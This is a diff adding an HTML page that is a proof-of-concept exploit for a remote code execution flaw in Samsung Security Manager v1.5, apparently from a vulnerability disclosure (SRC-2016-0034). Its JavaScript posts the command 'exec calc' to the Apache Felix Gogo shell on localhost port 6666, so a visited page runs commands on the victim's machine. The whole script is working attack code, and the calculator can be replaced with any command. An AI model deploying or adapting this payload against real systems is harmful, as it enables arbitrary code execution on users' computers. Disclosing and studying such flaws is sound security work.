@@ -1,0 +1,40 @@
+<html>
+<body>
+<script>
+
+/*
+
+Samsung Security Manager Apache Felix Gogo Remote Code Execution Vulnerability
+SRC: SRC-2016-0034
+
+Test On:
+========
+
+Windows 7 Ultimate x86 (fully patched)
+- SSM v1.40.0151109
+- SSM v1.50.0160509
+
+Using Firefox and Chrome Latest
+
+Notes:
+======
+
+Only v1.5 is affected.
+
+*/
+
+function send_request(string){
+  var x = new XMLHttpRequest();
+  x.open("POST", "http://localhost:6666");
+  x.send(string);
+}
+
+function hack_felix(){
+  var calc   = "exec calc\r\n";
+  send_request(calc);
+}
+
+hack_felix();
+</script>
+</body>
+</html>
